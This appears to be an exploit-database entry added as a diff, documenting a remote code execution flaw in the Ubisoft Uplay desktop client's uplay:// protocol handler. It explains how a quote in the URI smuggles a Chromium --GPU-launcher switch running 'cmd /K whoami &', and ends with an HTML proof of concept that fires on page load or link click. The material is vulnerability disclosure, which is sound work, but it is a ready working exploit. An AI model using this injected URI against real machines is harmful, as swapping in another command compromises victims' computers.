@@ -1,0 +1,82 @@
+# Exploit Title: Ubisoft Uplay Desktop Client 63.0.5699.0 - Remote Code Execution
+# Date: 2018-09-01
+# Exploit Author: Che-Chun Kuo
+# Vulnerability Type: URI Parsing Command Injection
+# Vendor Homepage: https://www.ubisoft.com/en-us/
+# Software Link: https://uplay.ubi.com/
+# Version: 63.0.5699.0
+# Tested on: Windows, Microsoft Edge
+# Advisory: https://forums.ubi.com/showthread.php/1912340-Uplay-PC-Client-July-17th-2018
+# CVE: N/A
+
+# Vulnerability
+# The Uplay desktop client does not properly validate user-controlled data passed to its custom 
+# uplay URI protocol handler. This flaw can be used to exploit the Chromium Embedded Framework (CEF) 
+# integrated within the Uplay client, allowing for arbitrary code execution.  
+
+# Installing Uplay registers the following custom uplay protocol handler: 
+# HKEY_CLASSES_ROOT
+#	uplay
+#		(Default) = "URL:uplay Protocol"
+#		URL Protocol = ""
+#			DefaultIcon
+#				(Default) = "upc.exe"
+#		Shell
+#			Open
+#			Command
+#				(Default) = "C:\Program Files (x86)\Ubisoft\Ubisoft Game Launcher\upc.exe" "%1"
+
+# The %1 will be replaced with arguments from the URI. The following crafted URI performs arbitrary code execution: 
+
+	'uplay://foobar" --GPU-launcher="cmd /K whoami &" --'
+
+# When a victim opens this URI, the string is passed to the Windows ShellExecute function. 
+# Microsoft states the following: "When ShellExecute executes the pluggable protocol handler with a 
+# string on the command line, any non-encoded spaces, quotes, and backslashes in the URI will 
+# be interpreted as part of the command line. This means that if you use C/C++’s argc and 
+# argv to determine the arguments passed to your application, the string may be broken 
+# across multiple parameters."
+	
+# "Malicious parties could use additional quote or backslash characters to pass additional command 
+# line parameters. For this reason, pluggable protocol handlers should assume that any parameters on 
+# the command line could come from malicious parties, and carefully validate them."
+
+# The Uplay desktop client does not properly validate user-controlled data. An attacker can inject 
+# certain Chromium flags that allow for arbitrary code execution. The malicious URI breaks the 
+# command line with a quote character and inserts a new switch called --GPU-launcher. Since the 
+# Uplay client uses the Chromium Embedded Framework (CEF), Chromium command lines switches are supported.
+# The --GPU-launcher switch provides a method to execute arbitrary commands. The following string shows 
+# the final command, which opens the Windows command prompt and executes the whoami program. 
+	
+	"C:\Program Files (x86)\Ubisoft\Ubisoft Game Launcher\upc.exe" "foobar" --GPU-launcher="cmd /K whoami &" --"
+	
+# Attack Scenario
+# The following attack scenario would result in the compromise of a victim's machine with the vulnerable 
+# Uplay client installed. A user running Microsoft Edge visits a specially crafted webpage or clicks on a 
+# specially crafted link. The user is served with the prompt: Did you mean to switch apps? Microsoft Edge 
+# is trying to open "UPlay launcher". After the user gives consent, the vulnerable application runs, 
+# resulting in arbitrary code execution in the context of the current process.
+
+# This scenario also works on IE, but the IE browser shows the URI string to be opened and warns users against 
+# opening untrusted content. Microsoft Edge provides no such warning. Chrome and Firefox both escape 
+# illegal characters before passing the URI to the protocol handler.
+
+# After Uplay desktop client (upc.exe) is run, upc.exe will attempt to open additional executables 
+# before the --GPU-launcher is activated. One notable executable is the UplayService.exe. UplayService 
+# requires elevated privileges. If the user is a non-administrative user a UAC prompt will appear. 
+# It should be noted, this UAC prompt doesn't prevent command execution from occurring. 
+# Regardless of which option the user chooses within the UplayService UAC prompt (Yes/No), 
+# command execution will still occur once the code that passes the --GPU-launcher switch 
+# to the CEF is triggered within upc.exe. 
+
+# Proof of Concept
+# The following POC provides two avenues to trigger the vulnerability within Microsoft Edge. 
+# The first method triggers when the webpage is opened. The second method triggers when the 
+# hyperlink is clicked by a user.
+
+<!doctype html>
+<a href='uplay://foobar" --GPU-launcher="cmd /K whoami &" --'>ubisoft uplay desktop client rce poc</a>
+
+<script>
+  window.location = 'uplay://foobar" --GPU-launcher="cmd /K whoami &" --'
+</script>
